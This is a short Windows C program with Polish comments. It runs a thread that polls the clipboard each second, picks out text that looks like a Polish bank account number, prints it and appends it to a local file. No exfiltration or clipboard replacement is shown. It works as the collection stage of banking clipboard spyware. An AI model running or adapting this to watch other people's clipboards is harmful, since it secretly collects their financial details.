#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>

#define MAX_TEXT_LENGTH 1024
#define FILENAME "bank_accounts.txt"


bool isBankAccount(char* text) {

	for (int i = 0; text[i] != '\0'; i++) {
		if (text[i] == 'P') {
			if (text[i+1] == 'L') {
				for (int j = i+2; j < i + 2 + 26 ; j++) {
					if (!(isdigit(text[j]) || text[j] == '-'))
						return false;
				}
				return true;
			}
		}
	}

	return false;
}

void saveToFile(char *text) {
	FILE* file = fopen(FILENAME, "a");
	if (file != NULL) {
		fprintf(file, "%s\n", text);
		fclose(file);
	}
	else {
		printf("B³¹d podczas otwierania pliku!\n");
	}
}

void clipboardMonitor() {
	char lastText[MAX_TEXT_LENGTH] = "";

	while (true) {
		if (OpenClipboard(NULL)) {
			HANDLE hData = GetClipboardData(CF_TEXT);
			
			if (hData != NULL) {
				char* text = (char*)GlobalLock(hData);
				if (text != NULL) {
					// pobieramy tekst
					// teraz sprawdzamy czy nie jest kopi¹ poprzedniego i czy jest rachunkiem bankowym
					if (strcmp(text, lastText) != 0 && isBankAccount(text)) {
						printf("Numer rachunku bankowego: %s\n", text);
						saveToFile(text);
						strncpy(lastText, text, MAX_TEXT_LENGTH);
					}
					GlobalUnlock(hData);
				}
			}
			CloseClipboard();
		}
			
		Sleep(1000);
	}
}


int main() {
	
	HANDLE* threads = malloc(sizeof(HANDLE) * 1);

	threads = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)clipboardMonitor, NULL, 0, NULL);

	while (true) {

	}

	return 0;
}